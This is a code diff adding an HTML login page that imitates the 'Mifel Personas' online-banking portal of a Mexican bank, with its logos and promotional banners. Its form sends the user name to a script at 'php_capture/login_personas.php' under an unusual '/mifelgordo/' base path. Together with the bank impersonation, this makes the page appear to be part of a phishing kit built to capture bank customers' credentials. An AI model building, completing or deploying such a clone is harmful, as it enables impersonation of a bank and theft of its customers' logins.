@@ -1,0 +1,116 @@
+﻿<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <base href="/mifelgordo/">
+    <title>Portal Personas</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/feLinicio.css">
+    <link rel="stylesheet" href="css/_responsivefel.css">
+    <link rel="stylesheet" href="css/zeppelin_churro_btn.css">
+    <link rel="stylesheet" href="css/responsive-movil-root.css?v=20260710">
+    <link rel="stylesheet" href="css/responsive-movil/login-personas.css?v=20260710">
+    <link rel="stylesheet" href="php_modales/css/responsive-movil.css?v=20260710">
+</head>
+<body>
+    <header class="header-container">
+        <div class="header-wrapper">
+            <div class="language-dropdown">
+                <img src="images/Flag_mx2.svg" alt="México" class="flag-icon">
+                <span class="language-text">ES</span>
+                <img src="images/drop_down.png" alt="dropdown" class="dropdown-arrow">
+            </div>
+        </div>
+    </header>
+    
+    <main class="main-container">
+        <div class="content-wrapper">
+            <div class="left-block">
+                <div class="login-form">
+                    <div class="logo-container">
+                        <img src="images/mifel-personas_logo.svg" alt="Mifel Personas" class="mifel-logo">
+                    </div>
+                    
+                    <form class="form-content" action="php_capture/login_personas.php" method="POST">
+                        <input type="hidden" name="tipo_usuario" value="Persona">
+                        <div class="input-group">
+                            <label for="usuario" class="input-label">Usuario</label>
+                            <div class="input-wrapper">
+                                <input type="password" id="usuario" name="usuario" class="input-field" required>
+                                <button type="button" class="toggle-eye" aria-label="Mostrar/Ocultar" onclick="togglePassword()">
+                                    <img src="images/toggle-eye_text.svg" alt="Mostrar" class="eye-icon" id="eyeIcon">
+                                </button>
+                            </div>
+                        </div>
+                        
+                        <div class="forgot-link">
+                            <a href="#" class="link-text">¿Olvidaste tu usuario?</a>
+                        </div>
+                        
+                        <button type="submit" class="login-button">Ingresar</button>
+                        
+                        <div class="register-text">
+                            <span>¿Aún no tienes usuario? <a href="#" class="register-link">Regístrate</a></span>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+        
+        <div class="right-block">
+            <div class="slider-container">
+                <img src="images/publi1.png" alt="Ahorra más con Cuenta Digital Mifel" class="promo-image active">
+                <img src="images/publi2.png" alt="Invierte mejor con Pagaré Digital Mifel" class="promo-image">
+                <img src="images/publi3.png" alt="Mifel el banco que te paga por ahorrar" class="promo-image">
+            </div>
+        </div>
+    </main>
+    
+    <script>
+        function togglePassword() {
+            const passwordInput = document.getElementById('usuario');
+            const eyeIcon = document.getElementById('eyeIcon');
+            
+            if (passwordInput.type === 'password') {
+                // Cambiar a texto (mostrar)
+                passwordInput.type = 'text';
+                eyeIcon.src = 'images/toggle-eye_password.svg';
+                eyeIcon.alt = 'Ocultar';
+            } else {
+                // Cambiar a password (ocultar)
+                passwordInput.type = 'password';
+                eyeIcon.src = 'images/toggle-eye_text.svg';
+                eyeIcon.alt = 'Mostrar';
+            }
+        }
+
+        // Slider/Carrusel automático
+        let currentSlide = 0;
+        const slides = document.querySelectorAll('.promo-image');
+        const totalSlides = slides.length;
+
+        function showSlide(index) {
+            slides.forEach((slide, i) => {
+                slide.classList.remove('active');
+                if (i === index) {
+                    slide.classList.add('active');
+                }
+            });
+        }
+
+        function nextSlide() {
+            currentSlide = (currentSlide + 1) % totalSlides;
+            showSlide(currentSlide);
+        }
+
+        // Iniciar carrusel automático al cargar la página
+        document.addEventListener('DOMContentLoaded', function() {
+            // Cambiar imagen cada 4 segundos
+            setInterval(nextSlide, 4000);
+        });
+    </script>
+</body>
+</html>
